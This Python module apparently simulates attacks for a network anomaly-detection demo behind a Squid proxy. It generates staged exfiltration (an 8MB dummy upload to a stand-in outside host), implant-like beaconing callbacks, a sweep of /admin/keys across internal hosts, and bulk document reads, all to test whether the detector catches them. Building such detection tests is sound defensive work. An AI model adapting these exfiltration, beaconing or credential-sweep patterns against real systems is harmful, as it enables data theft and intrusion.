"""The dangerous events the security agent is supposed to catch.

Each one is a *sequence*, not a single request, and each is anomalous in a
different way — so a demo can show that the detector is not just thresholding
one number. All of them run through Squid, so they arrive as ordinary events
with nothing marking them as planted.
"""

from __future__ import annotations

import time
import urllib.error
import urllib.request
from collections.abc import Callable
from dataclasses import dataclass

from faker import Faker

from .catalog import EXFIL_POOL, ROUTINE, STAGING


@dataclass
class Anomaly:
    key: str
    title: str
    why: str
    run: Callable[[urllib.request.OpenerDirector, str, float], list[str]]


def _denied_now(ingestion: str = "http://127.0.0.1:8100") -> set[str]:
    """Destinations Squid is already enforcing, per ingestion."""
    try:
        with urllib.request.urlopen(f"{ingestion}/v1/rules.txt", timeout=5) as r:
            return {x.strip().lstrip(".") for x in r.read().decode().split() if x.strip()}
    except OSError:
        return set()


def _get(opener: urllib.request.OpenerDirector, url: str, actor: str) -> None:
    request = urllib.request.Request(url, headers={"X-Actor": actor})
    with opener.open(request, timeout=20) as response:
        response.read()


def _post(opener: urllib.request.OpenerDirector, url: str, actor: str, body: bytes) -> bool:
    """POST, returning False if the proxy refused it.

    A denied destination does not fail politely mid-upload: Squid answers 403
    and closes while the client is still streaming, so urllib surfaces a
    BrokenPipeError rather than an HTTP status. Both mean the same thing —
    policy stopped the transfer — and neither should crash a demo. Being
    blocked here is a SUCCESS for the product; the run says so and moves on.
    """
    request = urllib.request.Request(url, data=body, method="POST", headers={"X-Actor": actor})
    try:
        with opener.open(request, timeout=180) as response:
            response.read()
        return True
    except urllib.error.HTTPError as exc:
        if exc.code == 403:
            return False
        raise
    except (urllib.error.URLError, BrokenPipeError, ConnectionError):
        return False


def pick_exfil_destination(denied: set[str]) -> str:
    """First pool host not already blocked, so repeat takes still tell the story."""
    for host in EXFIL_POOL:
        if host not in denied:
            return host
    return EXFIL_POOL[-1]


def _staged_exfiltration(
    opener: urllib.request.OpenerDirector, actor: str, pause: float
) -> list[str]:
    """Four reads across three systems, then a bulk transfer somewhere new."""
    fake = Faker()
    target = pick_exfil_destination(_denied_now())
    notes = []
    for host, path, label in STAGING:
        _get(opener, f"http://{host}{path}", actor)
        notes.append(f"{label} ({host})")
        time.sleep(pause)
    payload = b"S" * (8 * 1024 * 1024)
    delivered = _post(opener, f"http://{target}/upload/{fake.uuid4()}.tar.gz", actor, payload)
    if delivered:
        notes.append(f"8MB POST to {target} — no prior history for this destination")
    else:
        notes.append(
            f"8MB POST to {target} was BLOCKED by Squid — an approved denial "
            f"from an earlier run is still in force"
        )
    return notes


def _beaconing(opener: urllib.request.OpenerDirector, actor: str, pause: float) -> list[str]:
    """Small, evenly-spaced callbacks — the signature of an implant checking in.

    Invisible to a size threshold; only the regularity gives it away."""
    host = "telemetry.metrics-agent.test"
    for i in range(12):
        _get(opener, f"http://{host}/beacon?seq={i}", actor)
        time.sleep(pause / 3)
    return [f"12 evenly-spaced callbacks to {host} — periodicity, not volume"]


def _credential_sweep(opener: urllib.request.OpenerDirector, actor: str, pause: float) -> list[str]:
    """One actor touching every internal system in minutes — lateral movement."""
    for host in ROUTINE:
        _get(opener, f"http://{host}/admin/keys", actor)
        time.sleep(pause / 6)
    return [f"{actor} hit /admin/keys on all {len(ROUTINE)} internal systems in under a minute"]


def _offhours_bulk(opener: urllib.request.OpenerDirector, actor: str, pause: float) -> list[str]:
    """A volume of reads no human workflow produces."""
    host = "files.northwind-labs.test"
    fake = Faker()
    for _ in range(25):
        _get(opener, f"http://{host}/archive/{fake.file_name(extension='pdf')}", actor)
    return [f"25 rapid document reads from {host} by a single actor"]


CATALOG = [
    Anomaly(
        "exfil",
        "Staged exfiltration",
        "correlated reads then bulk upload",
        _staged_exfiltration,
    ),
    Anomaly("beacon", "Beaconing", "periodic small callbacks", _beaconing),
    Anomaly("sweep", "Credential sweep", "one actor, every system", _credential_sweep),
    Anomaly("bulk", "Bulk document access", "volume far above baseline", _offhours_bulk),
]

BY_KEY = {a.key: a for a in CATALOG}
